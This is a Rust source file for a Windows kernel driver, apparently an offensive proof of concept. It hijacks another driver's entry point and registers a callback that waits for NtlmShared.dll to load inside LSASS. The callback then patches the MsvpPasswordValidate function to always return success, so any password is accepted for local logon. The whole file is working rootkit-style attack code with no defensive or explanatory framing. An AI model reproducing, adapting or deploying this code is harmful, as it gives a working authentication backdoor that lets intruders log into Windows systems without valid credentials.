#![no_std]
#![feature(panic_info_message)]

mod include;

#[allow(unused_imports)]
use core::panic::PanicInfo;

extern crate alloc;
use crate::include::{
    ntddk::*,
    types::{
        IMAGE_INFO, LOAD_IMAGE_NOTIFY_ROUTINE, LOCK_OPERATION, MEMORY_CACHING_TYPE,
        MM_PAGE_PRIORITY, PEPROCESS, UNICODE_STRING,
    },
};
use alloc::ffi::CString;
use core::{ffi::c_void, ptr};
use kernel_log::KernelLogger;
use log::LevelFilter;
use winapi::{
    km::wdm::{DRIVER_OBJECT, KPROCESSOR_MODE},
    shared::{
        ntdef::{HANDLE, NTSTATUS},
        ntstatus::STATUS_SUCCESS,
    },
};

const JMP_SIZE: usize = 14;
const LEA_SIZE: usize = 7;
const RESTORE_DATA_SIZE: usize = JMP_SIZE + LEA_SIZE;
const LOGIN_PATCH: [u8; 7] = [
    0x48, 0x31, 0xC0, // xor rax, rax
    0x48, 0xFF, 0xC0, // inc rax
    0xC3, // ret
];

#[no_mangle]
#[export_name = "RestoreData"]
pub static mut RESTORE_DATA: [u8; RESTORE_DATA_SIZE] = [0; RESTORE_DATA_SIZE];

#[global_allocator]
static GLOBAL: kernel_alloc::KernelAlloc = kernel_alloc::KernelAlloc;

#[export_name = "_fltused"]
static _FLTUSED: i32 = 0;

#[no_mangle]
pub extern "system" fn __CxxFrameHandler3(_: *mut u8, _: *mut u8, _: *mut u8, _: *mut u8) -> i32 {
    unimplemented!()
}

#[cfg(not(test))]
#[panic_handler]
fn panic_handler(info: &core::panic::PanicInfo) -> ! {
    if let Some(location) = info.location() {
        log::error!(
            "[-] Panic in {} at ({}, {}):",
            location.file(),
            location.line(),
            location.column()
        );
        if let Some(message) = info.message() {
            log::error!("[-] {}", message);
        }
    }
    unsafe { include::ntddk::KeBugCheck(0xE2) }
}

type DriverEntry =
    fn(driver_object: &mut DRIVER_OBJECT, registry_path: &UNICODE_STRING) -> NTSTATUS;

#[no_mangle]
pub unsafe extern "system" fn driver_entry(
    driver_object: &mut DRIVER_OBJECT,
    registry_path: &UNICODE_STRING,
    target_entry: *mut c_void,
) -> NTSTATUS {
    KernelLogger::init(LevelFilter::Info).expect("Failed to initialize logger");
    log::info!("[+] Driver entry called! Welcome back");

    log::info!("[*] Restoring original entry point");
    copy_data(&RESTORE_DATA, target_entry);
    log::info!("[*] Registering callback for loaded images");
    if PsSetLoadImageNotifyRoutine(load_image_callback as LOAD_IMAGE_NOTIFY_ROUTINE)
        == STATUS_SUCCESS
    {
        log::info!("[+] Callback registered successfully!");
    }

    log::info!("[*] Executing unhooked DriverEntry of target driver");
    let original_driver_entry = core::mem::transmute::<*mut c_void, DriverEntry>(target_entry);
    original_driver_entry(driver_object, registry_path)
}

unsafe fn copy_data(src: &[u8], dst: *mut c_void) {
    let mdl = IoAllocateMdl(dst, src.len() as _, 0, 0, ptr::null_mut());
    if mdl.is_null() {
        panic!("IoAllocateMdl failed");
    }
    MmProbeAndLockPages(
        mdl,
        KPROCESSOR_MODE::KernelMode,
        LOCK_OPERATION::IoReadAccess,
    );
    let mapped = MmMapLockedPagesSpecifyCache(
        mdl,
        KPROCESSOR_MODE::KernelMode,
        MEMORY_CACHING_TYPE::MmNonCached,
        ptr::null_mut(),
        0,
        MM_PAGE_PRIORITY::HighPagePriority,
    );
    if mapped.is_null() {
        MmUnlockPages(mdl);
        IoFreeMdl(mdl);
        panic!("MmMapLockedPagesSpecifyCache failed");
    }
    ptr::copy_nonoverlapping(src.as_ptr(), mapped as _, src.len());
    MmUnmapLockedPages(mapped, mdl);
    MmUnlockPages(mdl);
    IoFreeMdl(mdl);
}

pub unsafe extern "C" fn load_image_callback(
    full_image_name: *const UNICODE_STRING,
    process_id: HANDLE,
    image_info: *mut IMAGE_INFO,
) {
    if (*full_image_name)
        .as_str()
        .expect("Failed to read UTF-16 string")
        .ends_with("NtlmShared.dll")
    {
        let target_base = (*image_info).ImageBase;
        log::info!("[+] Found NtlmShared.dll at address {:?}", target_base);
        let msvp_password_validate =
            common::get_export(target_base, &CString::new("MsvpPasswordValidate").unwrap())
                .expect("Failed to find MsvpPasswordValidate export");
        log::info!(
            "[+] MsvpPasswordValidate at address {:?}",
            msvp_password_validate
        );

        log::info!("[*] Attaching to LSASS process");
        let mut process = PEPROCESS::default();
        let process_ptr = core::ptr::addr_of_mut!(process);
        if PsLookupProcessByProcessId(process_id, process_ptr) != STATUS_SUCCESS {
            panic!("Failed to retrieve process from handle");
        }
        KeAttachProcess(process);
        log::info!("[*] Applying patch");
        copy_data(&LOGIN_PATCH, msvp_password_validate);
        log::info!("[+] MsvpPasswordValidate patch applied!");
        KeDetachProcess();
        ObDereferenceObject(process.0 as _);
        log::info!("[*] Detached from LSASS process");
    }
}
